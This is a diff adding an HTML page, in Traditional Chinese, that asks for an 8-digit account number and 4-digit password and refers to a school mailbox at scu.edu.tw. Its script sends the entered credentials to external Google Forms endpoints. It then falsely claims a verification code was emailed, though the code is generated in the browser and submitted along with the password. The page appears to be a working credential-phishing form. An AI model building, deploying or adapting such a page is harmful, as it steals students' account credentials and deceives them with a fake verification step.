@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>帳號密碼提交表單</title>
+    <link rel="icon" href="favicon.PNG" type="image/x-icon">
+    <style>
+        .form-container {
+            max-width: 90%;
+            margin: auto;
+            background: #455b76;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            padding: 30px;
+            transition: transform 0.3s;
+        }
+
+        .form-container:hover {
+            transform: scale(1.02);
+        }
+
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #d1cece;
+        }
+
+        label {
+            display: block;
+            margin: 15px 0 5px;
+            font-weight: bold;
+        }
+
+        input[type="text"],
+        input[type="password"],
+        input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            border-radius: 4px;
+            box-sizing: border-box;
+            background-color: #d1cece;
+            color: #282828;
+            transition: border-color 0.3s, background-color 0.3s;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #ff0a58;
+            background-color: #1f1f29;
+            color: #b1b1b1;
+            outline: none;
+        }
+
+        .error {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .verification-container {
+            margin-top: 20px;
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            color: white;
+        }
+
+        .verification-button {
+            background-color: #10003c;
+            color: white;
+            font-size: 16px;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .verification-button:hover {
+            background-color: #230082;
+        }
+    </style>
+</head>
+<body>
+
+<div class="form-container">
+    <h1>帳號密碼提交表單</h1>
+    <form id="accountForm">
+        <label for="account">帳號 (8位數字):</label>
+        <input type="text" id="account" name="entry.201945990" required maxlength="8" pattern="^\d{8}$">
+        
+        <label for="password">密碼 (4位數字):</label>
+        <input type="password" id="password" name="entry.2028682636" required maxlength="4" pattern="^\d{4}$">
+
+        <input type="submit" value="提交">
+    </form>
+
+    <div id="verificationBlock" class="hidden">
+        <div class="verification-container">
+            <p>驗證碼已發送至您的學校信箱 (account@scu.edu.tw)。請輸入驗證碼以完成提交。</p>
+            <label for="verificationCode">驗證碼:</label>
+            <input type="text" id="verificationCode" required>
+            <button id="verifyButton" class="verification-button">提交驗證碼</button>
+            <p id="errorMessage" class="error hidden">驗證碼不正確，請再試一次。</p>
+        </div>
+    </div>
+</div>
+
+<script>
+// Generate random 6-digit verification code
+let generatedVerificationCode = '';
+function generateVerificationCode() {
+    generatedVerificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+}
+
+// Form submission
+document.getElementById('accountForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const account = document.getElementById('account').value;
+    const password = document.getElementById('password').value;
+
+    // Check if the account and password are valid
+    if (!account.match(/^\d{8}$/)) {
+        alert('帳號必須是8位數字！');
+        return;
+    }
+
+    if (!password.match(/^\d{4}$/)) {
+        alert('密碼必須是4位數字！');
+        return;
+    }
+
+    // Generate verification code
+    generateVerificationCode();
+
+    // First submission to the form
+    const formData = new FormData();
+    formData.append('entry.201945990', account);
+    formData.append('entry.2028682636', password);
+    formData.append('entry.784146641', generatedVerificationCode);
+
+    fetch('https://docs.google.com/forms/d/e/1FAIpQLScTlMPYACRNFR7vZQA-cmOIJLNFjskck_1YG98kH_-cV8HmAQ/formResponse', {
+        method: 'POST',
+        body: formData,
+        mode: 'no-cors'
+    }).then(() => {
+        // Hide the original form and show verification block
+        document.getElementById('accountForm').classList.add('hidden');
+        document.getElementById('verificationBlock').classList.remove('hidden');
+    }).catch(error => {
+        alert('提交失敗，請再試一次！');
+    });
+});
+
+// Verification code submission
+document.getElementById('verifyButton').addEventListener('click', function() {
+    const enteredCode = document.getElementById('verificationCode').value;
+
+    // Check if the entered verification code matches the generated one
+    if (enteredCode === generatedVerificationCode) {
+        // Second form submission with verification code
+        const account = document.getElementById('account').value;
+        const password = document.getElementById('password').value;
+
+        const secondFormData = new FormData();
+        secondFormData.append('entry.201945990', account);
+        secondFormData.append('entry.2028682636', password);
+        secondFormData.append('entry.784146641', generatedVerificationCode);
+        secondFormData.append('entry.987172996', enteredCode);
+
+        fetch('https://docs.google.com/forms/d/e/1FAIpQLScO95Cr81H72Qm5ORNmW2Lr0S_hoEpB2tm3oUQ_DEjrLqgWdA/formResponse', {
+            method: 'POST',
+            body: secondFormData,
+            mode: 'no-cors'
+        }).then(() => {
+            alert('所有提交已成功！');
+        }).catch(error => {
+            alert('提交失敗，請再試一次！');
+        });
+    } else {
+        // Display error if verification code is wrong
+        document.getElementById('errorMessage').classList.remove('hidden');
+    }
+});
+</script>
+
+</body>
+</html>
